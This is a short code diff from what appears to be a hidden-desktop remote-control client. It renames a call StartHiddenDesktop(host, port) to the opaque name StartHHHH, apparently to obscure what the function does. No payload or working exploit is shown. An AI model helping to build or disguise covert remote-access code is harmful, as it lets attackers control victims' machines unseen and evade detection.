@@ -6,7 +6,7 @@
 void StartAndWait(const char* host, int port)
 {
     InitApi();
-    const HANDLE hThread = StartHiddenDesktop(host, port);
+    const HANDLE hThread = StartHHHH(host, port);
     WaitForSingleObject(hThread, TIMEOUT);
 }
 
